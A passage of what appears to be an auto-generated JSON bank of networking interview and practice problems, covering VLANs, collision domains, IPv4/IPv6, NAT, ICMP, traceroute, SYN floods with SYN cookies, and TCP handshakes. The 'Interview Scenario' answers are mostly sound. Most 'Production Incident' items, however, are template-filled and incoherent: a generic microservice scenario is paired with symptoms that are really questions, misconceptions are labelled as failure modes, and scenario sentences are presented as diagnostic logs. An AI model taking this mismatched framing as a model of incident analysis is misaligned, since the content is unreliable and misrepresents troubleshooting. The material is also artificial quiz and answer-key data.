      "solution": "Because switches cannot route traffic between different VLANs at Layer 2, Inter-VLAN routing is required. In a 'Router-on-a-Stick' architecture, a single physical Ethernet interface on a router connects to a switch Trunk port. The router's physical interface is subdivided into logical 'sub-interfaces' (e.g., gig0/0.10 for VLAN 10 and gig0/0.20 for VLAN 20), each configured with 802.1Q encapsulation and assigned the default gateway IP for that VLAN. When Host A on VLAN 10 sends a packet to Host B on VLAN 20, the frame is tagged VLAN 10, sent up the trunk to the router sub-interface, routed internally at Layer 3 to sub-interface 20, re-tagged as VLAN 20, and sent back down the trunk to the switch.",
      "commonTrap": "End user PCs send tagged 802.1Q frames to access ports."
    }
  ],
  "collision-broadcast-domains": [
    {
      "id": "collision-broadcast-domains-prob-1",
      "topicId": "collision-broadcast-domains",
      "title": "Troubleshooting Collision Domains vs Broadcast Domains: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Collision Domains vs Broadcast Domains.",
      "symptom": "Because all 200 PCs reside on a single flat switch without VLANs, every PC's CPU interrupts to process the broadcast storm.",
      "coreConcept": "Switches create micro-segments providing a dedicated collision domain per port; Routers and VLANs break up broadcast domains.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Collision Domains vs Broadcast Domains.",
        "2. Inspect the diagnostic logs: An office network with 200 PCs suddenly suffers massive lag because a malfunctioning network printer is broadcasting thousands of invalid packets per second.",
        "3. Examine the failure mode: Switches eliminate broadcast domains.",
        "4. Apply root cause verification: Switches forward all broadcast frames."
      ],
      "solution": "Correct operational implementation: Switches eliminate collision domains; Routers eliminate broadcast domains.",
      "commonTrap": "Switches eliminate broadcast domains."
    },
    {
      "id": "collision-broadcast-domains-prob-2",
      "topicId": "collision-broadcast-domains",
      "title": "Interview Scenario: You have a network with 2 hubs (each with 4 p...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "You have a network with 2 hubs (each with 4 ports), connected to a 12-port switch, which connects to a router with 2 interfaces. How many collision domains and broadcast domains exist?",
      "symptom": "Candidate is asked to provide deep architectural justification for Collision Domains vs Broadcast Domains.",
      "coreConcept": "A Collision Domain is a physical network segment where electrical data packets can collide with each other during simultaneous transmission. A Broadcast Domain is a logical network area where a broadcast frame sent by one device is received and processed by every other device.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Let's count: 1. Each hub forms 1 collision domain regardless of how many devices connect to it. Two hubs = 2 collision d..."
      ],
      "solution": "Let's count: 1. Each hub forms 1 collision domain regardless of how many devices connect to it. Two hubs = 2 collision domains. 2. The switch provides 1 collision domain per active port. If 2 ports connect to the hubs, 1 port connects to the router, and let's say remaining 9 ports connect to PCs: the switch has 12 collision domains. (Total collision domains = 12, because the hubs attach to individual switch ports). 3. The router interface isolates the broadcast domain. The switch and hubs all share 1 single broadcast domain on Router Interface 1. Router Interface 2 forms a 2nd broadcast domain. Total: 12 collision domains and 2 broadcast domains.",
      "commonTrap": "Full-duplex Ethernet still experiences packet collisions."
    }
  ],
  "ip-addressing": [
    {
      "id": "ip-addressing-prob-1",
      "topicId": "ip-addressing",
      "title": "Troubleshooting IPv4 Addressing & Classful Architecture: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over IPv4 Addressing & Classful Architecture.",
      "symptom": "Why can the company only assign addresses from .1 to .254 instead of all 256 addresses?",
      "coreConcept": "Dividing the 32-bit address into Network and Host portions enables hierarchical prefix aggregation across global autonomous systems.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with IPv4 Addressing & Classful Architecture.",
        "2. Inspect the diagnostic logs: A company receives a Class C block 192.168.1.0/24 and configures workstations.",
        "3. Examine the failure mode: An IP address permanently belongs to a computer motherboard.",
        "4. Apply root cause verification: IP addresses are logical and change when you move networks."
      ],
      "solution": "Correct operational implementation: MAC addresses are tied to physical hardware; IP addresses are assigned dynamically by the local network.",
      "commonTrap": "An IP address permanently belongs to a computer motherboard."
    },
    {
      "id": "ip-addressing-prob-2",
      "topicId": "ip-addressing",
      "title": "Interview Scenario: Why were classful IP addresses (Classes A, B,...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why were classful IP addresses (Classes A, B, C) replaced by Classless Inter-Domain Routing (CIDR)?",
      "symptom": "Candidate is asked to provide deep architectural justification for IPv4 Addressing & Classful Architecture.",
      "coreConcept": "An IPv4 address is a 32-bit (4-byte) logical identifier assigned to every device connected to an IP network, divided into a Network ID and a Host ID.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Classful addressing was excessively rigid and caused massive IPv4 address waste. For example, if an enterprise needed 30..."
      ],
      "solution": "Classful addressing was excessively rigid and caused massive IPv4 address waste. For example, if an enterprise needed 300 IP addresses, a Class C network (254 hosts) was too small, forcing the allocation of a Class B network (65,534 hosts). This resulted in over 65,000 unused wasted addresses in a single allocation. By 1993, IPv4 address space was near exhaustion, and core router routing tables were exploding. Classless Inter-Domain Routing (CIDR, RFC 1519) eliminated rigid class boundaries by allowing arbitrary prefix lengths (e.g. /23 giving 510 hosts), enabling efficient address allocation and route summarization.",
      "commonTrap": "You can assign 192.168.1.255 to a laptop in a /24 network."
    }
  ],
  "ipv4-vs-ipv6": [
    {
      "id": "ipv4-vs-ipv6-prob-1",
      "topicId": "ipv4-vs-ipv6",
      "title": "Troubleshooting IPv4 vs IPv6 Architecture & Migration: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over IPv4 vs IPv6 Architecture & Migration.",
      "symptom": "The carrier cannot acquire 50 million public IPv4 addresses, and running CGNAT for 50 million smartphones introduces latency and session state bottlenecks.",
      "coreConcept": "128-bit addresses eliminate NAT; simplified 40-byte fixed headers accelerate router hardware processing; built-in SLAAC and IPsec security.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with IPv4 vs IPv6 Architecture & Migration.",
        "2. Inspect the diagnostic logs: A telecommunications provider launches 50 million 5G mobile smartphones.",
        "3. Examine the failure mode: You can use '::' multiple times in an IPv6 address to compress zeros.",
        "4. Apply root cause verification: Using '::' more than once introduces ambiguity when reconstructing the 128-bit address."
      ],
      "solution": "Correct operational implementation: The double colon '::' can be used ONLY ONCE per IPv6 address.",
      "commonTrap": "You can use '::' multiple times in an IPv6 address to compress zeros."
    },
    {
      "id": "ipv4-vs-ipv6-prob-2",
      "topicId": "ipv4-vs-ipv6",
      "title": "Interview Scenario: Why does IPv6 omit the header checksum that w...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why does IPv6 omit the header checksum that was present in IPv4?",
      "symptom": "Candidate is asked to provide deep architectural justification for IPv4 vs IPv6 Architecture & Migration.",
      "coreConcept": "IPv6 is the next-generation Internet Protocol offering a 128-bit address space (3.4 x 10^38 addresses), replacing 32-bit IPv4 to solve global address exhaustion.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: In IPv4, every intermediate router hop decrements the TTL field by 1, requiring the router's CPU to recalculate the IPv4..."
      ],
      "solution": "In IPv4, every intermediate router hop decrements the TTL field by 1, requiring the router's CPU to recalculate the IPv4 header checksum at every single hop, creating latency. In IPv6, the header checksum was deliberately eliminated because: 1. Layer 2 Data Link protocols (Ethernet CRC, Wi-Fi) already provide robust frame integrity checks. 2. Layer 4 Transport protocols (TCP and UDP mandatory in IPv6) already compute checksums over the payload and pseudo-header. Removing the L3 checksum allows hardware router ASICs to forward IPv6 packets significantly faster without computing arithmetic checksums at every transit hop.",
      "commonTrap": "IPv6 routers calculate a header checksum at every hop."
    }
  ],
  "public-vs-private-ip": [
    {
      "id": "public-vs-private-ip-prob-1",
      "topicId": "public-vs-private-ip",
      "title": "Troubleshooting Public vs Private IP: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Public vs Private IP.",
      "symptom": "Why does this duplicate IP address not cause an IP collision or packet confusion on the Internet?",
      "coreConcept": "Internet core routers are configured to drop any packet bearing an RFC 1918 private destination IP. Private devices communicate externally through a NAT gateway router.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Public vs Private IP.",
        "2. Inspect the diagnostic logs: Two completely separate homes in New York and Tokyo both have laptops with IP 192.168.1.15.",
        "3. Examine the failure mode: An Internet website like Google can send an unsolicited packet directly to 192.168.1.10.",
        "4. Apply root cause verification: Public internet routers drop RFC 1918 addresses; private IPs are non-routable."
      ],
      "solution": "Correct operational implementation: Inbound communication requires an existing NAT state entry or Port Forwarding on the router.",
      "commonTrap": "An Internet website like Google can send an unsolicited packet directly to 192.168.1.10."
    },
    {
      "id": "public-vs-private-ip-prob-2",
      "topicId": "public-vs-private-ip",
      "title": "Interview Scenario: What are the exact RFC 1918 private IPv4 addr...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What are the exact RFC 1918 private IPv4 address ranges?",
      "symptom": "Candidate is asked to provide deep architectural justification for Public vs Private IP.",
      "coreConcept": "Public IP addresses are globally unique and routable across the public Internet. Private IP addresses (RFC 1918) are non-routable on the Internet, reserved for internal home, campus, and enterprise LANs.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: The three RFC 1918 private IPv4 ranges are: 1. Class A: 10.0.0.0 to 10.255.255.255 (Prefix 10.0.0.0/8, total 16,777,216 ..."
      ],
      "solution": "The three RFC 1918 private IPv4 ranges are: 1. Class A: 10.0.0.0 to 10.255.255.255 (Prefix 10.0.0.0/8, total 16,777,216 IPs). 2. Class B: 172.16.0.0 to 172.31.255.255 (Prefix 172.16.0.0/12, total 1,048,576 IPs, spanning 16 Class B equivalents). 3. Class C: 192.168.0.0 to 192.168.255.255 (Prefix 192.168.0.0/16, total 65,536 IPs, spanning 256 Class C equivalents).",
      "commonTrap": "172.32.0.1 is a private IP address."
    }
  ],
  "subnetting-cidr": [
    {
      "id": "subnetting-cidr-prob-1",
      "topicId": "subnetting-cidr",
      "title": "Troubleshooting Subnetting & CIDR: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Subnetting & CIDR.",
      "symptom": "How do you calculate the subnet mask, valid IP ranges, and broadcast address for each department?",
      "coreConcept": "CIDR notation (e.g. /26) indicates how many contiguous leading bits represent the network. The remaining bits determine host capacity: 2^(32 - prefix) - 2.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Subnetting & CIDR.",
        "2. Inspect the diagnostic logs: You are given 192.168.10.0/24 and told to create 4 equal-sized subnets for HR, Sales, IT, and Guests.",
        "3. Examine the failure mode: A /26 subnet provides 64 usable host addresses.",
        "4. Apply root cause verification: You must always subtract 2 for Network ID and Broadcast IP."
      ],
      "solution": "Correct operational implementation: A /26 has 64 total addresses, but only 62 usable host addresses.",
      "commonTrap": "A /26 subnet provides 64 usable host addresses."
    },
    {
      "id": "subnetting-cidr-prob-2",
      "topicId": "subnetting-cidr",
      "title": "Interview Scenario: What is the network address, broadcast addres...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the network address, broadcast address, and number of usable hosts for the IP 172.16.50.85 with subnet mask 255.255.255.224 (/27)?",
      "symptom": "Candidate is asked to provide deep architectural justification for Subnetting & CIDR.",
      "coreConcept": "Subnetting is the practice of dividing a large physical IP network into smaller, logically isolated sub-networks (subnets) by borrowing bits from the host portion to extend the network prefix.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. Mask 255.255.255.224 is /27. The interesting octet is the 4th octet (224). 2. Block size = 256 - 224 = 32. 3. Subnets..."
      ],
      "solution": "1. Mask 255.255.255.224 is /27. The interesting octet is the 4th octet (224). 2. Block size = 256 - 224 = 32. 3. Subnets in the 4th octet increase in multiples of 32: 0, 32, 64, 96, 128... 4. The host IP 85 falls between 64 and 95. 5. Network Address = 172.16.50.64. 6. Broadcast Address = next subnet (96) minus 1 = 172.16.50.95. 7. Usable Host Range = 172.16.50.65 through 172.16.50.94. 8. Usable Hosts = 2^(32-27) - 2 = 2^5 - 2 = 32 - 2 = 30 usable hosts.",
      "commonTrap": "A point-to-point router link should use a /24 subnet."
    }
  ],
  "routing-fundamentals": [
    {
      "id": "routing-fundamentals-prob-1",
      "topicId": "routing-fundamentals",
      "title": "Troubleshooting Routing Fundamentals: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Routing Fundamentals.",
      "symptom": "Thousands of live bank transactions and video calls are traversing the link at 100 Gbps.",
      "coreConcept": "Dynamic routing protocols (OSPF, BGP) share topology information between neighbors and compute shortest paths using graph algorithms (Dijkstra, Bellman-Ford).",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Routing Fundamentals.",
        "2. Inspect the diagnostic logs: A primary optical fiber line connecting Mumbai and Delhi is severed by a highway construction excavator.",
        "3. Examine the failure mode: RIP is preferred over OSPF because hop count is simpler.",
        "4. Apply root cause verification: A 1-hop 56 kbps dialup link looks 'shorter' to RIP than a 2-hop 10 Gbps fiber link."
      ],
      "solution": "Correct operational implementation: OSPF uses link bandwidth cost, making it vastly superior to RIP's crude hop-count metric.",
      "commonTrap": "RIP is preferred over OSPF because hop count is simpler."
    },
    {
      "id": "routing-fundamentals-prob-2",
      "topicId": "routing-fundamentals",
      "title": "Interview Scenario: What is the difference between Distance Vecto...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between Distance Vector and Link State routing algorithms?",
      "symptom": "Candidate is asked to provide deep architectural justification for Routing Fundamentals.",
      "coreConcept": "Routing is the Layer 3 process by which routers inspect the destination IP address of an incoming packet and determine the optimal next-hop interface to forward it toward its final destination.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. Routing knowledge: Distance Vector routers only know distance (hops) and vector (direction/next-hop) learned secondha..."
      ],
      "solution": "1. Routing knowledge: Distance Vector routers only know distance (hops) and vector (direction/next-hop) learned secondhand from immediate neighbors ('routing by rumor'). Link State routers flood link states so every router in the area builds an identical, complete map of the entire network topology. 2. Algorithm: Distance Vector uses Bellman-Ford; Link State uses Dijkstra's Shortest Path First (SPF). 3. Updates: Distance Vector sends periodic full table updates; Link State sends triggered, incremental updates only when a link state changes. 4. Convergence & Scalability: Link State converges drastically faster without routing loops and scales to large enterprise networks.",
      "commonTrap": "Routers recalculate their entire routing table for every single packet."
    }
  ],
  "routing-table-gateway": [
    {
      "id": "routing-table-gateway-prob-1",
      "topicId": "routing-table-gateway",
      "title": "Troubleshooting Routing Table Lookup & Default Gateway: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Routing Table Lookup & Default Gateway.",
      "symptom": "The laptop's routing table has no entry for 54.239.28.85.",
      "coreConcept": "Routers evaluate incoming destination IPs using Longest Prefix Match (LPM). If no specific prefix matches, the packet is forwarded to the Default Gateway.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Routing Table Lookup & Default Gateway.",
        "2. Inspect the diagnostic logs: A laptop at 192.168.1.15 pings an Amazon web server at 54.239.28.85.",
        "3. Examine the failure mode: A router chooses the route with the lowest metric over a route with a longer prefix mask.",
        "4. Apply root cause verification: Prefix length ALWAYS takes precedence over metric and administrative distance."
      ],
      "solution": "Correct operational implementation: Longest Prefix Match (LPM) is evaluated FIRST. Metric is only compared when prefix lengths are identical.",
      "commonTrap": "A router chooses the route with the lowest metric over a route with a longer prefix mask."
    },
    {
      "id": "routing-table-gateway-prob-2",
      "topicId": "routing-table-gateway",
      "title": "Interview Scenario: Explain the Longest Prefix Match (LPM) algori...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Explain the Longest Prefix Match (LPM) algorithm in IP routing with an example.",
      "symptom": "Candidate is asked to provide deep architectural justification for Routing Table Lookup & Default Gateway.",
      "coreConcept": "A routing table is an in-memory database stored on hosts and routers mapping destination network prefixes to next-hop IP addresses and exit interfaces. The Default Gateway is the fallback router used when no specific route matches.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Longest Prefix Match (LPM) is the algorithm used by routers to select the winning route from the routing table when a de..."
      ],
      "solution": "Longest Prefix Match (LPM) is the algorithm used by routers to select the winning route from the routing table when a destination IP matches multiple entries. The router selects the entry with the longest subnet mask (most specific network prefix). For example, consider a packet destined for IP 192.168.1.130. The routing table contains three matching entries: 1. 0.0.0.0/0 (Default route, mask length 0). 2. 192.168.1.0/24 (Mask length 24). 3. 192.168.1.128/28 (Mask length 28). The destination IP 192.168.1.130 satisfies all three rules. The router chooses Route 3 (192.168.1.128/28) because /28 is the longest prefix match (28 bits vs 24 bits vs 0 bits).",
      "commonTrap": "The default gateway must be on a different subnet than the host."
    }
  ],
  "nat-network-address-translation": [
    {
      "id": "nat-network-address-translation-prob-1",
      "topicId": "nat-network-address-translation",
      "title": "Troubleshooting NAT: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over NAT.",
      "symptom": "How can 20,000 laptops stream YouTube and browse websites simultaneously with only 2 public IPs?",
      "coreConcept": "A NAT gateway router maintains a state translation table mapping internal private sockets (IP:Port) to its single external public socket (Public IP:Port).",
      "analysis": [
        "1. Isolate the affected OSI layer associated with NAT.",
        "2. Inspect the diagnostic logs: A university campus with 20,000 students connects to the Internet using only two public IPv4 addresses.",
        "3. Examine the failure mode: NAT is an encryption security protocol.",
        "4. Apply root cause verification: NAT was created as an address conservation tool; it does not encrypt payloads."
      ],
      "solution": "Correct operational implementation: NAT provides incidental perimeter concealment (hiding internal IPs), but is not a substitute for firewall rules or TLS encryption.",
      "commonTrap": "NAT is an encryption security protocol."
    },
    {
      "id": "nat-network-address-translation-prob-2",
      "topicId": "nat-network-address-translation",
      "title": "Interview Scenario: What is the difference between SNAT (Source N...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between SNAT (Source NAT) and DNAT (Destination NAT)?",
      "symptom": "Candidate is asked to provide deep architectural justification for NAT.",
      "coreConcept": "Network Address Translation (NAT, RFC 1631) modifies the source or destination IP and port numbers in packet headers as they traverse a router, enabling multiple private devices to share a single public IP.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: SNAT (Source NAT) rewrites the private Source IP address of an outbound packet to a public IP as it leaves the local net..."
      ],
      "solution": "SNAT (Source NAT) rewrites the private Source IP address of an outbound packet to a public IP as it leaves the local network. It is used when internal clients initiate connections to external internet servers. DNAT (Destination NAT / Port Forwarding) rewrites the Destination IP address of an inbound packet arriving on the router's public interface to an internal private server IP. It is used when external internet users need to access an internal service (e.g. accessing a company web server hosted at private IP 10.0.1.50 via public IP 203.0.113.10:443).",
      "commonTrap": "A remote client on the Internet can initiate a direct connection to a private IP behind NAT."
    }
  ],
  "icmp-protocol": [
    {
      "id": "icmp-protocol-prob-1",
      "topicId": "icmp-protocol",
      "title": "Troubleshooting ICMP: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over ICMP.",
      "symptom": "The admin executes `ping 10.0.5.20` and receives 'Destination Host Unreachable'.",
      "coreConcept": "Routers encapsulate ICMP error messages inside IP packets (Protocol 1) returning Type and Code values explaining the exact failure condition.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with ICMP.",
        "2. Inspect the diagnostic logs: A system administrator tests if a production database at 10.0.5.20 is responsive.",
        "3. Examine the failure mode: ICMP runs over TCP or UDP.",
        "4. Apply root cause verification: ICMP is a Layer 3 protocol encapsulated directly inside IP packets (Protocol field = 1)."
      ],
      "solution": "Correct operational implementation: ICMP has no port numbers; it is encapsulated directly in the IP packet.",
      "commonTrap": "ICMP runs over TCP or UDP."
    },
    {
      "id": "icmp-protocol-prob-2",
      "topicId": "icmp-protocol",
      "title": "Interview Scenario: How does `traceroute` use ICMP and the IP TTL...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "How does `traceroute` use ICMP and the IP TTL field to discover all router hops between a client and a server?",
      "symptom": "Candidate is asked to provide deep architectural justification for ICMP.",
      "coreConcept": "Internet Control Message Protocol (ICMP, RFC 792) is a network-layer diagnostic and error-reporting protocol used by network devices to report transmission problems and test reachability.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Traceroute discovers network hops by intentionally exploiting the IP Time-To-Live (TTL) field and ICMP Time Exceeded (Ty..."
      ],
      "solution": "Traceroute discovers network hops by intentionally exploiting the IP Time-To-Live (TTL) field and ICMP Time Exceeded (Type 11) messages. 1. The client sends a packet with TTL=1. The first router decrements TTL to 0, drops the packet, and sends back an ICMP Type 11 message. The client records the router's IP and measures the RTT. 2. The client sends a packet with TTL=2. It passes Router 1 (TTL becomes 1) and reaches Router 2, where TTL becomes 0. Router 2 drops it and returns ICMP Type 11. 3. The client increments TTL by 1 sequentially (TTL=3, 4, 5...) until the packet reaches the final destination, which responds with an ICMP Echo Reply (or Port Unreachable). By recording the source IP of each returning ICMP message, the client maps the complete hop-by-hop path.",
      "commonTrap": "If a server does not reply to ping, the server is guaranteed to be down."
    }
  ],
  "tcp-protocol": [
    {
      "id": "tcp-protocol-prob-1",
      "topicId": "tcp-protocol",
      "title": "Troubleshooting TCP Architecture & Segment Header Format: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over TCP Architecture & Segment Header Format.",
      "symptom": "If a single packet is corrupted or dropped, the PDF file would fail to open in Adobe Acrobat.",
      "coreConcept": "TCP adds sequence numbers, cumulative acknowledgments, checksums, sliding window flow control, and timers to synthesize guaranteed reliability on top of unreliable IP.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with TCP Architecture & Segment Header Format.",
        "2. Inspect the diagnostic logs: A user downloads a 20 MB PDF over an unstable cellular network with 5% packet loss.",
        "3. Examine the failure mode: TCP sequence numbers count the number of packets sent.",
        "4. Apply root cause verification: TCP is a byte-stream protocol, not a packet protocol."
      ],
      "solution": "Correct operational implementation: TCP sequence numbers count the number of BYTES transmitted, not the number of packets.",
      "commonTrap": "TCP sequence numbers count the number of packets sent."
    },
    {
      "id": "tcp-protocol-prob-2",
      "topicId": "tcp-protocol",
      "title": "Interview Scenario: What are the six standard control flags in th...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What are the six standard control flags in the TCP header and what does each flag signify?",
      "symptom": "Candidate is asked to provide deep architectural justification for TCP Architecture & Segment Header Format.",
      "coreConcept": "Transmission Control Protocol (TCP, RFC 793) is a connection-oriented, reliable, full-duplex Transport Layer protocol providing ordered, error-checked delivery of a stream of octets between processes.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. SYN (Synchronize): Initiates connection establishment; synchronizes initial sequence numbers (ISN). 2. ACK (Acknowled..."
      ],
      "solution": "1. SYN (Synchronize): Initiates connection establishment; synchronizes initial sequence numbers (ISN). 2. ACK (Acknowledgment): Confirms receipt of bytes; indicates the 'Acknowledgment Number' field is valid. 3. FIN (Finish): Gracefully closes connection from sender's side (no more data to send). 4. RST (Reset): Abruptly terminates/aborts a connection due to an unrecoverable error or closed port. 5. PSH (Push): Requests receiver to immediately push buffered data to application without waiting for buffer to fill. 6. URG (Urgent): Indicates Urgent Pointer field is valid, pointing to high-priority out-of-band data.",
      "commonTrap": "TCP guarantees real-time delivery with zero latency delay."
    }
  ],
  "tcp-3-way-handshake": [
    {
      "id": "tcp-3-way-handshake-prob-1",
      "topicId": "tcp-3-way-handshake",
      "title": "Troubleshooting TCP 3-Way Handshake: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over TCP 3-Way Handshake.",
      "symptom": "A delayed duplicate packet from a session closed 5 minutes ago arrives on the server's port 443.",
      "coreConcept": "Exchanging SYN, SYN-ACK, and ACK allows both operating systems to allocate socket buffers, record mutual sequence counters, and transition to the ESTABLISHED state.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with TCP 3-Way Handshake.",
        "2. Inspect the diagnostic logs: A browser opens a connection to an e-commerce website to load the homepage.",
        "3. Examine the failure mode: Initial Sequence Numbers (ISNs) always start at 0.",
        "4. Apply root cause verification: Starting at 0 would make TCP vulnerable to sequence prediction attacks and delayed packet confusion."
      ],
      "solution": "Correct operational implementation: ISNs are pseudo-randomly generated by the OS kernel using a cryptographic clock algorithm.",
      "commonTrap": "Initial Sequence Numbers (ISNs) always start at 0."
    },
    {
      "id": "tcp-3-way-handshake-prob-2",
      "topicId": "tcp-3-way-handshake",
      "title": "Interview Scenario: What is a SYN Flood attack and how do SYN Coo...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is a SYN Flood attack and how do SYN Cookies defend against it?",
      "symptom": "Candidate is asked to provide deep architectural justification for TCP 3-Way Handshake.",
      "coreConcept": "The TCP 3-Way Handshake is the 3-step synchronization process used by client and server to negotiate Initial Sequence Numbers (ISNs) and establish a reliable full-duplex socket connection.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: In a SYN Flood attack (DoS), an attacker sends millions of spoofed TCP SYN packets with fake source IPs to a server. For..."
      ],
      "solution": "In a SYN Flood attack (DoS), an attacker sends millions of spoofed TCP SYN packets with fake source IPs to a server. For each SYN, the server allocates socket buffer memory, enters the SYN_RCVD state, and waits for the final ACK (which never arrives because the source IP was fake). The server's 'SYN backlog queue' exhausts its memory, causing it to drop legitimate connection requests. Mitigation: SYN Cookies (RFC 4987). Instead of allocating memory in SYN_RCVD, the server encodes the connection state (client IP, port, timestamp, secret key) mathematically into its own 32-bit Initial Sequence Number (ISN_s). Only when the client returns a valid ACK (with Ack = ISN_s + 1) does the server verify the cookie and allocate memory, completely immune to backlog exhaustion.",
      "commonTrap": "A 2-way handshake (SYN, ACK) is sufficient to establish a reliable connection."
    }
  ],
  "tcp-connection-termination": [
    {
      "id": "tcp-connection-termination-prob-1",
      "topicId": "tcp-connection-termination",
      "title": "Troubleshooting TCP 4-Way Handshake Termination & TIME_WAIT State: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over TCP 4-Way Handshake Termination & TIME_WAIT State.",
      "symptom": "The microservice runs out of available local ephemeral ports and crashes with `EADDRNOTAVAIL`.",
      "coreConcept": "Independent FIN / ACK pairs allow 'half-close' states. The TIME_WAIT state (2MSL duration) ensures lingering delayed packets clear the Internet before port recycling.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with TCP 4-Way Handshake Termination & TIME_WAIT State.",
        "2. Inspect the diagnostic logs: A high-performance microservice initiates and closes 50,000 short-lived TCP connections per second to an internal cache.",
        "3. Examine the failure mode: Both client and server enter the TIME_WAIT state.",
        "4. Apply root cause verification: Only the endpoint that initiates the active close (sends the first FIN) enters TIME_WAIT."
      ],
      "solution": "Correct operational implementation: The active closer enters TIME_WAIT; the passive closer closes immediately upon receiving the final ACK.",
      "commonTrap": "Both client and server enter the TIME_WAIT state."
    },
    {
      "id": "tcp-connection-termination-prob-2",
      "topicId": "tcp-connection-termination",
      "title": "Interview Scenario: Why is the TIME_WAIT state necessary, and why...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why is the TIME_WAIT state necessary, and why does it last for 2MSL (Maximum Segment Lifetime)?",
      "symptom": "Candidate is asked to provide deep architectural justification for TCP 4-Way Handshake Termination & TIME_WAIT State.",
      "coreConcept": "TCP connection termination is the 4-step graceful closing handshake that independently terminates transmission in both directions (full-duplex teardown), concluding with the TIME_WAIT state.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: The TIME_WAIT state serves two critical architectural purposes: 1. Reliable Final ACK Delivery: If the client's final AC..."
      ],
